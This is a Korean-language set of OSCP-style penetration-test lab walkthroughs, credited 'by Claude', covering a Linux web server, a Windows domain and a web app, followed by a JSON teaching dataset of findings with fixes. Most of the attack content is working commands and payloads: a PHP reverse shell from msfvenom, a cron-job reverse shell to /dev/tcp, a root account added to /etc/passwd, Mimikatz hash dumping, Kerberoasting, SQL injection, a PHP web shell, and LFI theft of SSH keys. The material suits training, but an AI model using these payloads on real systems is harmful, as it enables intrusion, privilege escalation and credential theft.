@@ -1,0 +1,486 @@
+OSCP 스타일의 현실적인 침투 테스트 단계별 시나리오
+by Claude
+
+## 📦 시나리오 #1: "Legacy Web Server" (난이도: 중)
+
+### 🎯 타겟 정보
+```
+Target: 192.168.10.75
+Hostname: legacy-web.local
+OS: Ubuntu 16.04 LTS
+Difficulty: Medium
+Points: 20/100
+```
+
+### 📊 Phase 1: Enumeration (정보 수집)
+
+#### Nmap 스캔 결과
+```bash
+# nmap -sV -sC -p- 192.168.10.75
+
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 2.3.4
+22/tcp    open  ssh         OpenSSH 7.2p2
+80/tcp    open  http        Apache/2.4.18 (Ubuntu)
+139/tcp   open  netbios-ssn Samba 3.0.20
+445/tcp   open  netbios-ssn Samba 3.0.20
+3306/tcp  open  mysql       MySQL 5.7.12
+
+Service Info: OS: Unix
+
+NSE: Script scanning
+| smb-os-discovery:
+|   OS: Unix (Samba 3.0.20)
+|   NetBIOS computer name: LEGACY-WEB
+|_  Domain name: legacy-web.local
+```
+
+#### 웹 서비스 확인 (Dirb/Gobuster)
+```bash
+# gobuster dir -u http://192.168.10.75 -w /usr/share/wordlists/dirb/common.txt
+
+/admin                (Status: 301)
+/backup               (Status: 200)
+/uploads              (Status: 301)
+/phpinfo.php          (Status: 200)
+/config.php.bak       (Status: 200)  ← 중요!
+```
+
+#### FTP 익명 로그인 테스트
+```bash
+# ftp 192.168.10.75
+Name: anonymous
+Password: [엔터]
+
+230 Login successful.
+ftp> ls
+-rw-r--r--    1 0        0            1234 Sep 15 2023 passwords.txt
+-rw-r--r--    1 0        0             458 Sep 15 2023 notes.txt
+```
+
+### 🔓 Phase 2: Initial Access (최초 침투)
+
+#### 발견 #1: 설정 파일 노출
+**파일**: `/config.php.bak`
+```php
+<?php
+$db_host = "localhost";
+$db_user = "webapp";
+$db_pass = "W3bApp!2023#Secure";  // ← 크리덴셜 획득!
+$db_name = "legacy_db";
+?>
+```
+
+#### 발견 #2: 업로드 취약점
+**위치**: `/admin/upload.php`
+- 파일 확장자 검증 부재
+- PHP 웹쉘 업로드 가능
+
+#### Exploitation 시도
+```bash
+# 1. PHP 리버스 쉘 준비
+msfvenom -p php/reverse_php LHOST=192.168.10.50 LPORT=4444 -f raw > shell.php
+
+# 2. 리스너 실행
+nc -lvnp 4444
+
+# 3. 쉘 업로드 후 접근
+curl http://192.168.10.75/uploads/shell.php
+```
+
+#### 결과: 웹 서버 계정으로 접근 성공
+```bash
+www-data@legacy-web:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@legacy-web:/var/www/html$ uname -a
+Linux legacy-web 4.4.0-142-generic #168-Ubuntu x86_64 GNU/Linux
+```
+
+### ⬆️ Phase 3: Privilege Escalation
+
+#### LinPEAS 실행 결과 (핵심만)
+```bash
+[+] SUID files
+/usr/bin/find
+/usr/bin/nmap  ← 위험!
+/bin/bash  ← 매우 위험!
+
+[+] Interesting writable files
+/etc/passwd  ← 쓰기 가능!
+
+[+] Cron jobs
+* * * * * root /opt/backup.sh  ← root 권한 스크립트
+
+[+] Backup files found
+/home/admin/.bash_history
+/opt/backup.sh
+```
+
+#### 발견된 PrivEsc 경로 3가지
+
+**방법 1: SUID bash 활용**
+```bash
+www-data@legacy-web$ /bin/bash -p
+bash-4.3# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+```
+
+**방법 2: /etc/passwd 조작**
+```bash
+# 패스워드 생성
+openssl passwd -1 -salt xyz password123
+# $1$xyz$xxxxxxxx...
+
+# /etc/passwd에 추가
+echo 'hacker:$1$xyz$xxxxxxxx:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# 새 계정으로 전환
+su hacker
+Password: password123
+root@legacy-web#
+```
+
+**방법 3: Cron Job Hijacking**
+```bash
+# /opt/backup.sh 내용 확인 (www-data 쓰기 가능)
+cat /opt/backup.sh
+#!/bin/bash
+tar -czf /backup/www.tar.gz /var/www/
+
+# 리버스 쉘 추가
+echo 'bash -i >& /dev/tcp/192.168.10.50/5555 0>&1' >> /opt/backup.sh
+
+# 1분 후 root 쉘 획득
+```
+
+### 🎯 Phase 4: Post-Exploitation
+
+#### Flag 획득
+```bash
+root@legacy-web# cat /root/proof.txt
+8f9e4a2b7c1d3e5f6a0b9c8d7e6f5a4b
+
+root@legacy-web# cat /etc/shadow | grep root
+root:$6$xyz$...:18900:0:99999:7:::
+```
+
+#### 추가 정보 수집
+```bash
+# 다른 호스트 발견
+root@legacy-web# cat /etc/hosts
+192.168.10.10   db-server.local
+192.168.10.20   admin-panel.local
+
+# 저장된 크리덴셜
+root@legacy-web# cat /root/.bash_history
+mysql -u root -p'R00tP@ssw0rd!'
+ssh admin@192.168.10.20
+```
+
+---
+
+## 📦 시나리오 #2: "Corporate Portal" (난이도: 상)
+
+### 🎯 타겟 정보
+```
+Target: 10.10.11.150
+Hostname: portal.corporate.local
+OS: Windows Server 2019
+Difficulty: Hard
+Points: 30/100
+```
+
+### 📊 Phase 1: Enumeration
+
+#### Nmap 결과
+```bash
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          IIS 10.0
+139/tcp   open  netbios-ssn   
+445/tcp   open  microsoft-ds  Windows Server 2019
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+```
+
+#### SMB Enumeration
+```bash
+# smbclient -L //10.10.11.150 -N
+
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+Backups         Disk      Old backup files  ← 접근 가능!
+```
+
+### 🔓 Phase 2: Initial Access
+
+#### 발견: SMB 공유에서 크리덴셜 획득
+```bash
+# smbclient //10.10.11.150/Backups -N
+
+smb: \> ls
+  web.config.bak           2048  Mon Sep 11 15:23:10 2023
+  credentials.txt          1024  Mon Sep 11 15:25:33 2023
+
+smb: \> get credentials.txt
+```
+
+#### credentials.txt 내용
+```
+SQL Server Credentials:
+Username: sa
+Password: SQLAdmin123!@#
+
+Portal Admin:
+Username: admin@corporate.local  
+Password: P0rtalAdmin2023!
+
+Service Account:
+Username: svc_backup
+Password: BackupSvc!2023
+```
+
+#### SQL Injection 대신 정당한 로그인
+```bash
+# mssqlclient.py 'sa:SQLAdmin123!@#'@10.10.11.150
+
+SQL> SELECT @@version;
+Microsoft SQL Server 2019 (RTM) - 15.0.2000.5
+
+SQL> EXEC xp_cmdshell 'whoami';
+nt authority\system  ← 즉시 SYSTEM!
+```
+
+### ⬆️ Phase 3: Lateral Movement
+
+#### 도메인 정보 수집
+```powershell
+# WinRM으로 접속
+evil-winrm -i 10.10.11.150 -u administrator -p 'P0rtalAdmin2023!'
+
+*Evil-WinRM* PS C:\Users\Administrator> Get-ADUser -Filter *
+
+Name                    SamAccountName
+----                    --------------
+Administrator           administrator
+John Smith              jsmith
+Sarah Connor            sconnor
+Service Account         svc_backup
+```
+
+#### 다른 머신으로 피벗
+```powershell
+# 네트워크 스캔
+*Evil-WinRM* PS> Get-NetComputer
+
+Name                   IP Address
+----                   ----------
+DC01                   10.10.11.100
+FILESERVER01           10.10.11.101
+PORTAL                 10.10.11.150 (현재 위치)
+
+# Pass-the-Hash 공격
+*Evil-WinRM* PS> Invoke-Mimikatz
+
+[NTLM Hash Dumped]
+administrator:500:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+```
+
+### 🎯 Phase 4: Domain Admin 획득
+
+#### Kerberoasting 공격
+```bash
+# GetUserSPNs.py로 SPN 계정 찾기
+GetUserSPNs.py corporate.local/svc_backup:BackupSvc!2023 -dc-ip 10.10.11.100
+
+ServicePrincipalName           Name        MemberOf
+-----------------------------  ----------  --------
+HTTP/portal.corporate.local    svc_web     CN=Domain Admins,CN=Users,DC=corporate,DC=local
+
+[TGS Hash]
+$krb5tgs$23$*svc_web$corporate.local...
+
+# Hashcat으로 크랙
+hashcat -m 13100 hash.txt rockyou.txt
+Result: ServicePass2023!
+```
+
+#### Domain Admin 권한 획득
+```powershell
+# DA 계정으로 접속
+evil-winrm -i 10.10.11.100 -u svc_web -p 'ServicePass2023!'
+
+*Evil-WinRM* PS> whoami /groups
+GROUP INFORMATION
+-----------------
+CORPORATE\Domain Admins
+
+*Evil-WinRM* PS> type C:\Users\Administrator\Desktop\proof.txt
+9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
+```
+
+---
+
+## 📋 시나리오 #3: "Multi-Step Web App" (웹 전문)
+
+### 공격 체인 요약
+```
+1. SQL Injection (로그인 우회)
+   ↓
+2. File Upload (웹쉘 업로드)
+   ↓
+3. Local File Inclusion (크리덴셜 읽기)
+   ↓
+4. Sudo Misconfiguration (root 권한)
+```
+
+### 상세 Exploitation
+
+#### Step 1: SQL Injection
+```http
+POST /login.php HTTP/1.1
+Host: 192.168.1.100
+
+username=admin' OR '1'='1&password=anything
+
+Response: HTTP/1.1 302 Found
+Location: /dashboard.php
+Set-Cookie: PHPSESSID=abc123...
+```
+
+#### Step 2: Unrestricted File Upload
+```http
+POST /dashboard/upload.php HTTP/1.1
+Content-Type: multipart/form-data
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="shell.php.png"
+
+<?php system($_GET['cmd']); ?>
+------WebKitFormBoundary--
+
+# 업로드 후 접근
+curl "http://192.168.1.100/uploads/shell.php.png?cmd=id"
+uid=33(www-data) gid=33(www-data)
+```
+
+#### Step 3: LFI를 통한 민감 파일 읽기
+```bash
+# /etc/passwd 읽기
+curl "http://192.168.1.100/view.php?page=../../../../etc/passwd"
+
+# SSH 키 탈취
+curl "http://192.168.1.100/view.php?page=../../../../home/developer/.ssh/id_rsa"
+
+# SSH 접속
+chmod 600 stolen_key
+ssh -i stolen_key developer@192.168.1.100
+```
+
+#### Step 4: Sudo Privesc
+```bash
+developer@target$ sudo -l
+User developer may run the following commands on target:
+    (ALL : ALL) NOPASSWD: /usr/bin/find
+
+developer@target$ sudo find . -exec /bin/bash \; -quit
+root@target# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
+
+## 🎓 강의용 데이터셋
+
+### JSON 형태로 정리된 시나리오 데이터
+
+```json
+{
+  "testName": "Legacy Web Server Pentest",
+  "date": "2024-12-10",
+  "tester": "Junsang Dong",
+  "target": {
+    "ip": "192.168.10.75",
+    "hostname": "legacy-web.local",
+    "os": "Ubuntu 16.04 LTS"
+  },
+  "findings": [
+    {
+      "id": 1,
+      "title": "Backup Configuration File Exposure",
+      "severity": "High",
+      "cvss": 7.5,
+      "category": "Information Disclosure",
+      "description": "The web server exposes a backup configuration file (config.php.bak) containing database credentials in plaintext.",
+      "impact": "An attacker can obtain database credentials and potentially gain unauthorized access to the database server.",
+      "affected": "http://192.168.10.75/config.php.bak",
+      "steps": [
+        "Browse to http://192.168.10.75/config.php.bak",
+        "Download the file",
+        "Extract database credentials: webapp / W3bApp!2023#Secure"
+      ],
+      "evidence": "File contents showed plaintext credentials",
+      "remediation": "Remove all backup files from the web directory. Implement proper backup procedures that store sensitive files outside the web root.",
+      "references": ["CWE-530", "OWASP-A05"]
+    },
+    {
+      "id": 2,
+      "title": "Unrestricted File Upload",
+      "severity": "Critical",
+      "cvss": 9.8,
+      "category": "Remote Code Execution",
+      "description": "The admin upload functionality does not properly validate file types, allowing arbitrary PHP code execution.",
+      "impact": "An attacker can upload a PHP web shell and execute arbitrary commands with www-data privileges.",
+      "affected": "http://192.168.10.75/admin/upload.php",
+      "steps": [
+        "Access /admin/upload.php",
+        "Upload PHP reverse shell",
+        "Access uploaded file at /uploads/shell.php",
+        "Obtain reverse shell as www-data"
+      ],
+      "evidence": "Successfully uploaded and executed PHP reverse shell",
+      "remediation": "Implement strict file type validation. Use a whitelist approach for allowed file extensions. Store uploaded files outside the web root or with a randomized name.",
+      "references": ["CWE-434", "OWASP-A04"]
+    },
+    {
+      "id": 3,
+      "title": "SUID Bash Binary",
+      "severity": "Critical",
+      "cvss": 9.8,
+      "category": "Privilege Escalation",
+      "description": "/bin/bash has SUID bit set, allowing any user to escalate to root privileges.",
+      "impact": "Any user with shell access can immediately obtain root privileges.",
+      "affected": "/bin/bash (SUID bit set)",
+      "steps": [
+        "Identify SUID bash: find / -perm -4000 2>/dev/null",
+        "Execute: /bin/bash -p",
+        "Verify root access: id"
+      ],
+      "evidence": "Successfully escalated to root (euid=0)",
+      "remediation": "Remove SUID bit from /bin/bash: chmod u-s /bin/bash. Review all SUID binaries and remove unnecessary permissions.",
+      "references": ["CWE-269"]
+    }
+  ],
+  "timeline": [
+    "14:00 - Initial scan and enumeration",
+    "14:15 - Discovered config.php.bak exposure",
+    "14:30 - Exploited file upload vulnerability",
+    "14:45 - Obtained www-data shell",
+    "15:00 - Privilege escalation via SUID bash",
+    "15:05 - Root flag captured"
+  ],
+  "flags": {
+    "user": "f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8",
+    "root": "8f9e4a2b7c1d3e5f6a0b9c8d7e6f5a4b"
+  }
+}
+```
